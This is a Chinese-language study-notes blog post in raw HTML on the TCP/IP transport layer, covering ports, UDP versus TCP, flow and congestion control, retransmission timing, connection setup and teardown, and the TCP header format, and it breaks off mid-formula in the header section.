运输层概述"></a>5.1 运输层概述</h2><img src="/posts/e255a10a/5.1.1.png" class="" title="引入"><img src="/posts/e255a10a/5.1.2.png" class="" title="引入"><p>假设进程1与进程4之间进行基于网络的通信，它们通信的简单过程如下：</p><ol><li>根据不同的进程，在运输层选择使用不同的端口</li><li>通过网络层及其下层来传输应用层报文</li><li>将收到的应用层报文到达接收方的运输层后，通过不同的端口，交付给应用层中相应的应用进程</li></ol><p>ps：这里端口并不是指看得见、摸得着的物理端口，而是指用来区分不同应用进程的标识符。</p><p>运输层向高层用户屏蔽了下面网络核心的细节(如网络拓扑、所采用的路由选择协议等)，它使应用进程看见的就好像是在两个运输层实体之间有一条端到端的逻辑通信信道。</p><p>根据应用需求的不同，因特网的运输层为应用层提供了两种不同的运输协议，即面向连接的TCP和无连接的UDP。</p><h2 id="5-2-运输层端口号、复用和分用的概念"><a href="#5-2-运输层端口号、复用和分用的概念" class="headerlink" title="5.2 运输层端口号、复用和分用的概念"></a>5.2 运输层端口号、复用和分用的概念</h2><ul><li>在操作系统中，运行在计算机上的进程使用进程标识符PID来标志，但是因特网上的计算机并不是使用统一的操作系统，不同的操作系统使用不同格式的进程标识符。</li><li>为了使运行不同系统的计算机的应用进程之间能够进行网络通信，就必须使用统一的方法来对TCP/IP体系的应用进程进行标识。</li><li>TCP/IP体系的运输层使用端口号来区分应用层的不同应用进程。</li><li>端口号使用16比特表示，取值范围0~65535<ul><li>熟知端口号：0~1023，IANA把这些端口号指派给了TCP/IP体系中最重要的一些应用协议，例如：FTP使用21/20，HTTP使用80，DNS使用53，HTTPS使用443</li><li>登记端口号：1024~49151，为没有熟知端口号的应用程序使用。使用这类端口号必须在IANA按照规定的手续登记，以防止重复。例如：Microsoft RDP微软远程桌面使用的端口是3389</li><li>短暂端口号：49152~65535，留给客户进程选择暂时使用。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程以后使用</li></ul></li><li>端口号只具有本地意义，即端口号只是为了标识本计算机应用层中的各进程，在因特网中，不同计算机中的相同端口号是没有联系的。</li></ul><h3 id="5-2-1-发送方的复用和接收方的分用"><a href="#5-2-1-发送方的复用和接收方的分用" class="headerlink" title="5.2.1 发送方的复用和接收方的分用"></a>5.2.1 发送方的复用和接收方的分用</h3><img src="/posts/e255a10a/5.2.1.png" class="" title="发送方的复用和接收方的分用"><p>发送方的某些应用进程所发送的不同应用报文，在运输层使用UDP协议进行封装，称为UDP复用；而另一些应用进程所发送的不同应用报文，在运输层使用TCP协议进行封装，称为TCP复用。</p><h3 id="5-2-2-TCP-IP体系的应用层常用协议所使用的运输层熟知端口号"><a href="#5-2-2-TCP-IP体系的应用层常用协议所使用的运输层熟知端口号" class="headerlink" title="5.2.2 TCP/IP体系的应用层常用协议所使用的运输层熟知端口号"></a>5.2.2 TCP/IP体系的应用层常用协议所使用的运输层熟知端口号</h3><img src="/posts/e255a10a/5.2.2.png" class="" title="熟知端口号"><p>举例：运输层端口号</p><img src="/posts/e255a10a/5.2.3.png" class="" title="运输层端口号"><p>DNS服务器：记录有某域名所对应的IP地址，在输入网页域名后，在hosts中找不到网页对应的IP地址时，就要通过DNS服务器获取域名对应的IP地址。</p><p>Web服务器：某域名的服务器，也就是前面几章所说的目的主机，在访问域名时IP数据报最终到达Web服务器，服务器进行响应。</p><p>假如我们在浏览器中输入某域名访问，若此时在本地hosts缓存中有该域名的IP地址，直接发送带有目的地址的IP数据报；若计算机中没有该域名对应的IP地址，进行以下操作：</p><ol><li><p>构建DNS请求报文，将该UDP请求封装成IP数据报通过以太网发送给DNS服务器。DNS服务器将UDP用户响应数据报封装在IP数据报中发送给用户。此时会将数据载荷，也就是DNS响应报文交给DNS进程进行处理，DNS进程将其响应报文进行解析，就可知道自己之前所请求的Web服务器的IP地址。</p><img src="/posts/e255a10a/5.2.4.png" class="" title="DNS请求与响应"></li><li><p>知道域名对应的IP地址后，可以开始构建HTTP请求，构建该请求需要TCP首部，封装在IP数据报中并发送该请求到Web服务器。Web服务器在接收到报文后会对其进行解析，在知道其端口为80后，会将数据载荷部分传输给本服务器中的HTTP服务器端进程进行解析。解析到内容后按照其要求查找首页内容，查找到后会给用户PC发送HTTP响应报文。</p><img src="/posts/e255a10a/5.2.5.png" class="" title="HTTP请求与响应"></li><li><p>用户PC接收到报文后进行解封，解封后发现目的端口是49152，也就是用户PC内的HTTP进程。因此将数据载荷（HTTP报文）传输给HTTP进程进行处理。HTTP进程解析到其内容后，在网页浏览器中进行展示。</p><img src="/posts/e255a10a/5.2.6.png" class="" title="用户PC显示内容"></li></ol><h2 id="5-3-UDP与TCP的对比"><a href="#5-3-UDP与TCP的对比" class="headerlink" title="5.3 UDP与TCP的对比"></a>5.3 UDP与TCP的对比</h2><ol><li><p>连接方式上：</p><img src="/posts/e255a10a/5.3.1.png" class="" title="UDP与TCP"></li><li><p>传播方式上：</p><img src="/posts/e255a10a/5.3.2.png" class="" title="UDP与TCP"></li><li><p>报文传输处理上：</p><img src="/posts/e255a10a/5.3.3.png" class="" title="UDP与TCP"></li><li><p>给上层提供服务上：</p><img src="/posts/e255a10a/5.3.4.png" class="" title="UDP与TCP"></li><li><p>协议首部对比上：</p><img src="/posts/e255a10a/5.3.5.png" class="" title="UDP与TCP"></li></ol><div class="table-container"><table><thead><tr><th>UDP(User Datagram Protocol)</th><th>TCP(Transmission Control Protocol)</th></tr></thead><tbody><tr><td>无连接</td><td>面向连接</td></tr><tr><td>支持一对一、一对多、多对一、多对多交互通信</td><td>每一条TCP连接只能有两个端点，只能一对一通信</td></tr><tr><td>对应用层交付的报文直接打包</td><td>面向字节流</td></tr><tr><td>尽最大努力交付，也就是不可靠；不使用流量控制和拥塞控制</td><td>可靠传输，使用流量控制和拥塞控制</td></tr><tr><td>首部开销小，仅8个字节</td><td>首部最小20字节，最大60字节</td></tr></tbody></table></div><h2 id="5-4-TCP流量控制"><a href="#5-4-TCP流量控制" class="headerlink" title="5.4 TCP流量控制"></a>5.4 TCP流量控制</h2><ul><li>对于数据传输，我们希望传输得越快越好，但是若传输过快会导致接收方不够时间接收数据，造成数据丢失。</li><li>流量控制(flow control)就是为了让发送方速率不要太快，要让接收方来得及接收。</li><li>利用滑动窗口机制可以很方便地在TCP连接上实现对发送方的流量控制。</li></ul><img src="/posts/e255a10a/5.4.1.png" class="" title="TCP流量控制"><p>ACK = 1：表示是一个TCP确认字段<br>ack = 201：201编号以前的数据全部确认收到<br>rwnd = 300：将接收窗口大小调整为300</p><img src="/posts/e255a10a/5.4.2.png" class="" title="TCP流量控制"><img src="/posts/e255a10a/5.4.3.png" class="" title="TCP流量控制"><p>此时由于窗口为0，不再发送数据。</p><img src="/posts/e255a10a/5.4.4.png" class="" title="TCP流量控制"><p>为了解决这个问题，TCP为每一个连接设有一个持续计时器。在连接的一方接收到对方的零窗口通知后一段时间后，超时计时器到时，就会发送一个1字节的零窗口发送报文，在接收方接收到该信号后，就会通告自己的窗口大小。当知道窗口可以传输数据后，就会开始通信。</p><img src="/posts/e255a10a/5.4.5.png" class="" title="TCP流量控制"><p>上图如果零窗口探测报文在发送过程中如果丢失，还是能打破死锁局面。因为零窗口探测报文段也有重传计时器，重传计时器超时后，零窗口探测报文段会被重传。</p><p>值得注意的是，TCP中规定不论接收方有没有空间，都必须接收发送方的3种报文：零窗口检测报文段、确认报文段、携带有紧急数据的报文段。</p><h2 id="5-5-TCP拥塞控制"><a href="#5-5-TCP拥塞控制" class="headerlink" title="5.5 TCP拥塞控制"></a>5.5 TCP拥塞控制</h2><ul><li><p>拥塞指的是某段时间内，若对网络中的某一资源的需求超过了该资源所能提供的可用部分，网络性能就要变坏。</p><ul><li>在计算机网络中的资源包括链路容量（即带宽）、交换节点中的缓存和处理机等。</li></ul></li><li>若出现拥塞而不进行控制，整个网络的吞吐量将随输入负载的增大而下降。</li></ul><img src="/posts/e255a10a/5.5.1.png" class="" title="TCP拥塞控制"><p>在图中，绿色指的是理想情况下不发生拥塞的情况，此时吞吐量与输入负载相等。当网络资源数被全部利用时，吞吐量不再增长。</p><p>红色线指的是出现拥塞不进行处理，会导致吞吐量下降，直到吞吐量为零，产生死锁现象。</p><p>蓝色线是实际的拥塞控制曲线，在出现拥塞后采用拥塞控制措施，使吞吐量保持在一定水平。</p><p>拥塞控制的4种算法：慢开始(slow-start)、拥塞避免(congestion avoidance)、快重传(fast retransmit)、快恢复(fast recovery)。</p><p>在讨论4种算法前，假定如下条件：</p><ol><li>数据是单方向传送，而另一个方向只传送确认</li><li>接收方总是有足够大的缓存空间，因而发送方发送窗口的大小由网络的拥塞程度来决定</li><li>以最大报文段(MSS)的个数为讨论问题的单位，而不是以字节为单位</li></ol><img src="/posts/e255a10a/5.5.2.png" class="" title="TCP拥塞控制"><h3 id="5-5-1-慢开始与拥塞避免"><a href="#5-5-1-慢开始与拥塞避免" class="headerlink" title="5.5.1 慢开始与拥塞避免"></a>5.5.1 慢开始与拥塞避免</h3><ul><li>慢开始算法是用来确定网络的负载能力或拥塞程度。</li><li>算法是实现是由小到大逐渐增大（以倍数增长）拥塞窗口数值。<br>以一次数据报文传输过程学习慢开始算法</li><li>慢开始指的是一开始网络注入的报文段少，并不是指拥塞窗口cwnd的增长速度慢。</li></ul><img src="/posts/e255a10a/5.5.3.png" class="" title="慢开始"><p>拥塞窗口达到慢开始门限ssthresh后，慢开始算法使用阶段结束，开始拥塞避免算法阶段。</p><ul><li>拥塞避免算法让拥塞窗口 cwnd 缓慢地增大（每轮窗口大小+1），避免出现拥塞。</li><li>在拥塞避免阶段，具有 “加法增大” (Additive Increase) 的特点。</li><li>拥塞避免算法并不能完全避免拥塞，只是在拥塞避免阶段将容易拥塞的窗口控制为按线性规律增长，使网络比较不容易出现拥塞。</li></ul><img src="/posts/e255a10a/5.5.4.png" class="" title="拥塞避免"><p>循环重复此传输过程，若传输过程中部分报文段丢失，在重传计时器时间内没有收到确认报文(即重传计时器超时)，则判断网络很可能出现了拥塞。进行以下工作：</p><ol><li>将ssthresh值更新为拥塞时cwnd值的一半</li><li>将cwnd值减少为1，重新开始执行慢开始算法</li></ol><img src="/posts/e255a10a/5.5.5.png" class="" title="拥塞避免"><h3 id="5-5-2-快重传与快恢复"><a href="#5-5-2-快重传与快恢复" class="headerlink" title="5.5.2 快重传与快恢复"></a>5.5.2 快重传与快恢复</h3><img src="/posts/e255a10a/5.5.6.png" class="" title="快重传与快恢复"><ul><li>采用快重传算法可以让发送方尽早知道发生了个别报文段的丢失。</li><li>所谓快重传，就是使发送方尽快进行重传，而不是等超过重传计时器超时再重传。<ul><li>要求接收方不要等待自己发送数据时才进行捎带确认，而是要立即发送确认。</li><li>即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认。</li><li>发送方一旦收到了3个连续的重复确认，就将相应的报文段立即重传，而不是等该报文段的超时重传计时器超时再重传。</li><li>对于个别丢失的报文段，发送方不会出现超时重传，也就不会误认为出现了拥塞(进而降低拥塞窗口cwnd为1)。使用快重传可以使整个网络的吞吐量提高约20%。</li></ul></li></ul><img src="/posts/e255a10a/5.5.7.png" class="" title="快重传"><ul><li>发送方一旦收到3个重复确认，就知道现在只是丢失了个别的报文段。于是不启动慢开始算法，而执行快恢复算法。<ul><li>发送方将慢开始门限ssthresh值和拥塞窗口cwnd值调整为当前窗口的一半，开始执行拥塞避免算法。</li><li>也有的快恢复实现是把快恢复开始时的拥塞窗口cwnd值再增大一些，即等于新的ssthresh+3。<ul><li>既然发送方收到了3个重复的确认，就表明有3个数据报文段已经离开了网络；</li><li>这3个报文段不再消耗网络资源而是停留在接收方的接收缓存中；</li><li>可见现在网络中不是堆积了报文段而是减少了3个报文段，因此可以适当把拥塞窗口扩大些。</li></ul></li></ul></li></ul><img src="/posts/e255a10a/5.5.8.png" class="" title="四种算法综合"><h2 id="5-6-TCP超时重传时间的选择"><a href="#5-6-TCP超时重传时间的选择" class="headerlink" title="5.6 TCP超时重传时间的选择"></a>5.6 TCP超时重传时间的选择</h2><p>TCP超时重传时间的选择是TCP最复杂的问题之一，若超时重传时间(RTO)比往返时间(RTT)短会导致不必要的重传，使网络负荷增大；若RTO比RTT过长会导致网络的空闲时间增大，降低了传输效率。因此，RTO的设置应该略大于往返时间(RTT)。但是此时又会出现一个问题，由于网络传输环境的不同，导致接下来的RTT是不确定的，如此应该如何认定RTO？</p><img src="/posts/e255a10a/5.6.1.png" class="" title="TCP超时重传时间的选择"><img src="/posts/e255a10a/5.6.2.png" class="" title="TCP超时重传时间的选择"><img src="/posts/e255a10a/5.6.3.png" class="" title="TCP超时重传时间的选择"><img src="/posts/e255a10a/5.6.4.png" class="" title="TCP超时重传时间的选择"><img src="/posts/e255a10a/5.6.5.png" class="" title="TCP超时重传时间的选择"><p>举例：</p><img src="/posts/e255a10a/5.6.6.png" class="" title="例子"><h2 id="5-7-TCP可靠传输的实现"><a href="#5-7-TCP可靠传输的实现" class="headerlink" title="5.7 TCP可靠传输的实现"></a>5.7 TCP可靠传输的实现</h2><p>TCP基于以字节为单位的滑动窗口来实现可靠传输。</p><p>例如：接收方告诉发送方它的接收窗口为20字节，确认号字段的值为31，这表明接收方希望收到下一个数据的序号为31，序号为31前的数据已被正确接收。</p><img src="/posts/e255a10a/5.7.1.png" class="" title="TCP可靠传输"><img src="/posts/e255a10a/5.7.2.png" class="" title="TCP可靠传输的例子"><img src="/posts/e255a10a/5.7.3.png" class="" title="TCP可靠传输的例子"><p>若接收方收到未按序到达的数据，如本例收到32、33编号字节数据，由于TCP的确认方式是只能发送按序收到的最高序号确认，因此发送一个ack = 31的确认信号，也就是表示现在需要发送方发送31号数据。</p><p>发送方收到ack = 31报文后，知道31号数据未按序到达，但是根据上面所学的知识，只有3次接收到同一个ack信号才会进行重传，此时不做处理，继续发送往下的数据。</p><img src="/posts/e255a10a/5.7.4.png" class="" title="TCP可靠传输的例子"><p>此时若成功接收到31号数据，此时31到33号数据按序到达，此时接收方会择机将数据交给应用层，并且将窗口向后滑动3字节，同时发送确认报文。</p><img src="/posts/e255a10a/5.7.5.png" class="" title="TCP可靠传输的例子"><p>在接收方发送的确认报文被发送方收到后，会将发送窗口向后滑动若干字节（此处为3字节）。发送方此时会将31、32、33字节数据从缓存中删除。此时若发送方又发送了3个未按序到达的数据，接收方接受数据后不做处理。</p><img src="/posts/e255a10a/5.7.6.png" class="" title="TCP可靠传输的例子"><p>若发送方发送完全部的发送窗口数据，此时不能再发送数据。若迟迟等不到接收方确认信号，重传计时器超时，此时会重新发送发送窗口内已发送的数据，并重启重传计时器。</p><img src="/posts/e255a10a/5.7.7.png" class="" title="TCP可靠传输"><img src="/posts/e255a10a/5.7.8.png" class="" title="习题一"><img src="/posts/e255a10a/5.7.9.png" class="" title="习题二"><h2 id="5-8-TCP的运输连接管理"><a href="#5-8-TCP的运输连接管理" class="headerlink" title="5.8 TCP的运输连接管理"></a>5.8 TCP的运输连接管理</h2><img src="/posts/e255a10a/5.8.1.png" class="" title="TCP的运输连接管理"><h3 id="5-8-1-TCP的连接建立-三次握手"><a href="#5-8-1-TCP的连接建立-三次握手" class="headerlink" title="5.8.1 TCP的连接建立(三次握手)"></a>5.8.1 TCP的连接建立(三次握手)</h3><p>TCP的连接建立要解决以下三个问题：</p><ol><li>使TCP双方都能确知对方的存在</li><li>使TCP双方能够协商一些参数（如窗口最大值、是否使用窗口扩大选项和时间戳选项和服务质量等等）</li><li>使TCP双方能够对运输实体资源（如缓存大小、连接表中的项目等）进行分配</li></ol><p>使用三报文握手建立连接的具体过程：</p><p>在最开始，客户端和服务器都是处于关闭状态，此时双方的TCP进程都是关闭的。服务器在连接之前要进行准备，创建传输控制块，在块中有TCP连接表等一些TCP连接的重要信息。创建后便开始监听，准备接收来自客户端的连接请求。与服务器类似，客户端进程也需要进行准备，其准备过程只有创建传输数据块。准备完毕后开始“握手”。</p><img src="/posts/e255a10a/5.8.3.png" class="" title="TCP的运输连接管理"><p>在打算建立TCP连接时，客户端向服务器进程发送TCP连接请求报文段，并进入同步已发送状态。TCP连接请求报文段首部中，有两个关键数据位：</p><ul><li>同步位SYN：被设置为1，表明这是一个TCP连接请求报文段</li><li>序号字段seq：被设置了一个初始值x，作为TCP客户端进程所选择的初始序号</li></ul><p>注意：TCP规定SYN被设置为1的报文段不能携带数据，但要消耗掉一个序号。</p><img src="/posts/e255a10a/5.8.4.png" class="" title="TCP的运输连接管理"><p>TCP服务器进程收到客户端发送的TCP连接请求报文段后，如果同意建立连接，则向TCP客户进程发送TCP连接请求确认报文段，并进入同步已接收状态。TCP连接请求确认报文段首部中有几个关键数据位：</p><ul><li>同步位SYN和确认位ACK：都设置为1，表明这是一个TCP连接请求确认报文段</li><li>序号字段seq：设置了一个初始值y，作为TCP服务器进程所选择的初始序号</li><li>确认号字段ack：值被设置成了x+1，这是对TCP客户进程所选择的初始序号（seq）的确认</li></ul><p>注意：这个报文段也不能携带数据，因为它是SYN被设置为1的报文段，但同样要消耗掉一个序号。</p><img src="/posts/e255a10a/5.8.5.png" class="" title="TCP的运输连接管理"><p>TCP客户进程收到TCP连接请求确认报文段后，还要向TCP服务器进程发送一个普通的TCP确认报文段，并进入连接已建立状态。普通的TCP确认报文段首部中有以下重点数据位：</p><ul><li>确认位ACK：设置为1，由于没有SYN同步字段，表明这是一个普通的TCP确认报文段，表示已确认收到建立连接报文</li><li>序号字段seq：设置为x+1，因为TCP客户进程发送的第一个TCP报文段的序号为x，所以TCP客户进程发送的第二个报文段的序号为x+1（SYN字段报文需要消耗一个序号）</li><li>确认号字段ack：设置为y+1，这是对TCP服务器进程所选择的初始序号的确认</li></ul><p>注意：TCP规定普通的TCP确认报文段(只有ACK没有SYN)可以携带数据，但如果不携带数据，则不消耗序号。</p><p>三次握手完毕后，服务器也进入连接已建立状态，此时双方连接已建立，可以开始进行数据传输。</p><img src="/posts/e255a10a/5.8.2.png" class="" title="TCP的运输连接管理"><p>为什么TCP客户进程最后还要发送一个普通的TCP确认报文段呢？是否多余？</p><img src="/posts/e255a10a/5.8.6.png" class="" title="两次握手"><p>三次握手并不多余，三次握手建立连接是为了防止已经失效的连接请求报文段突然又传到服务端，产生错误。</p><h3 id="5-8-2-TCP的连接释放-四次挥手"><a href="#5-8-2-TCP的连接释放-四次挥手" class="headerlink" title="5.8.2 TCP的连接释放(四次挥手)"></a>5.8.2 TCP的连接释放(四次挥手)</h3><p>TCP通过四报文挥手来释放连接：</p><p>在双方连接已建立后，此时客户端主动发出关闭信号。</p><img src="/posts/e255a10a/5.8.7.png" class="" title="TCP的连接释放"><p>TCP客户进程会发送TCP连接释放报文段，并进入终止等待1状态。TCP连接释放报文段首部中有以下关键数据位：</p><ul><li>终止位FIN和确认位ACK：值都被设置为1，表明这是一个TCP连接释放报文段，同时也对之前收到的报文段进行确认</li><li>序号字段seq：值设置为u，表示TCP客户进程之前已传送过的、数据的最后一个字节的序号加1</li><li>确认号字段ack：值设置为v，表示TCP服务器进程之前已传送过的、数据的最后一个字节的序号加1</li></ul><p>注意：TCP规定终止位FIN等于1的报文段即使不携带数据，也要消耗掉一个序号。</p><img src="/posts/e255a10a/5.8.8.png" class="" title="TCP的连接释放"><p>接收方在接收到连接释放报文后，会发送一个普通的TCP确认报文段并且进入关闭等待状态。普通的TCP确认报文段首部中有以下关键数据位：</p><ul><li>确认位ACK：值被设置为1，表明这是一个普通的TCP确认报文段</li><li>序号字段seq：值设置为v，v等于TCP服务器进程之前已传送过的、数据的最后一个字节的序号加1，与之前收到的TCP连接释放报文段中的确认号ack值匹配</li><li>确认号字段ack：值为u+1，这是对TCP连接释放报文段的确认，也就是为发送方连接释放报文中的seq的值+1</li></ul><p>在进行第二次挥手后，会产生以下过程：</p><p>TCP服务器进程通知高层应用进程，TCP客户进程要断开与自己的TCP连接，此时的TCP连接进入半关闭状态。</p><p>所谓半关闭状态可以认为，此时客户端与服务器的连接不再传输数据，也就是客户端没有数据发送。而此时服务器若有剩余数据要发送会继续发送。客户端到服务器的数据传输信道关闭了，而服务器到客户端这一半没有关闭，因此称为半关闭状态。这个半关闭状态可能会持续一段时间，直到发送方没有数据进行发送。</p><p>在以上等待过程中，客户端会进入终止等待2状态：</p><img src="/posts/e255a10a/5.8.9.png" class="" title="TCP的连接释放"><p>当服务器没有数据要传输后，进行第三次挥手：</p><img src="/posts/e255a10a/5.8.10.png" class="" title="TCP的连接释放"><p>此时TCP服务器进程会发送TCP连接释放报文段并进入最后确认状态。在该报文段中有以下关键数据段：</p><ul><li>终止位FIN和确认位ACK：值都被设置为1，表明这是一个TCP连接释放报文段，同时也对之前收到的报文段进行确认</li><li>序号seq：值为w，因为在半关闭状态下，TCP服务器进程可能又发送一段数据，因此w就是该段数据最后的序号</li><li>确认号ack：值为u+1，这是对之前收到的TCP连接释放报文段的重复确认，因此值为发送方第一次挥手发送的seq值+1</li></ul><p>TCP客户进程收到TCP连接释放报文段后开始第四次挥手：</p><img src="/posts/e255a10a/5.8.11.png" class="" title="TCP的连接释放"><p>此时针对第三次挥手的报文段发送普通的TCP确认报文段，之后进入时间等待状态。该报文段首部中有以下关键数据位：</p><ul><li>确认位ACK：值被设置为1，表明这是一个普通的TCP确认报文段</li><li>序号字段seq：值设置为u+1，用来表示最后一个发送的字节序号，这是因为TCP客户进程之前发送的TCP连接释放报文段(带有FIN)虽然不携带数据，但要消耗掉一个序号</li><li>确认号ack：值设置为w+1，这是对所收到的TCP连接释放报文段的确认</li></ul><p>TCP服务器进程收到该报文段后就进入关闭状态，而TCP客户进程还要经过2倍的MSL后才能进入关闭状态：</p><img src="/posts/e255a10a/5.8.12.png" class="" title="TCP的连接释放"><p>MSL具体的值可以根据TCP协议的不同实现进行设置。</p><p>为什么不发送报文段后直接关闭，而是要等待2MSL个时间后才关闭？是否有必要？</p><img src="/posts/e255a10a/5.8.13.png" class="" title="TCP的连接释放"><p>若客户端发送完最后一次报文后，也就是第四次挥手后就直接进入关闭状态，此时若第四次挥手报文丢失，会导致服务器的超时重传。</p><p>此时客户端又已经关闭，导致不接受该报文，因此服务器会一直不断重传，并一直处于最后确认状态无法进入关闭状态。</p><p>因此，有以下结论：客户端进入时间等待状态以及处于该状态2MSL时长，可以确保TCP服务器进程可以收到最后一个TCP确认报文段而进入关闭状态。</p><p>TCP客户进程在发送完最后一个TCP确认报文段后，再经过2MSL时长，就可以使本次连接持续时间内所产生的所有报文段都从网络中消失，这样就可以使下一个新的TCP连接中，不会出现旧连接中的报文段。</p><p>若出现这样一种情况：</p><p>TCP双方已经建立了连接，但是传输过程中TCP客户进程所在的主机出现了故障，此时TCP服务器进程以后就不能再收到TCP客户进程发来的数据，这时服务器进程会一直处于等待状态。为了使TCP服务器进程不要再白白等待下去，出现了TCP保活计时器：</p><img src="/posts/e255a10a/5.8.14.png" class="" title="TCP保活计时器"><h2 id="5-9-TCP报文的首部格式"><a href="#5-9-TCP报文的首部格式" class="headerlink" title="5.9 TCP报文的首部格式"></a>5.9 TCP报文的首部格式</h2><ul><li>为了实现可靠传输，TCP采用了面向字节流的方式。</li><li>TCP在发送数据时，从发送缓存中取出一部分或者全部字节，并给其添加一个首部使之成为TCP报文段后进行发送。<ul><li>一个TCP报文段由首部和数据载荷两部分构成；</li><li>TCP的全部功能都体现在它首部中各字段的作用。</li></ul></li></ul><img src="/posts/e255a10a/5.9.1.png" class="" title="TCP报文的首部格式"><p>TCP首部和IP地址的首部类似，都由固定部分和扩展部分构成。</p><p><strong>相关字段功能解释</strong>：</p><ul><li>源端口和目的端口：各占16比特。</li><li>序号：占32比特，取值范围<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.211ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 4513.2 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(1222.7,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(2735,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3735.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4235.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container>，序号增加到最后一个后，下一个序号又从0开始。用来指出本TCP报文段数据载荷的第一个字节的序号。</li><li>确认号：占32比特，取值范围<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="10.211ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 4513.2 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(1222.7,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 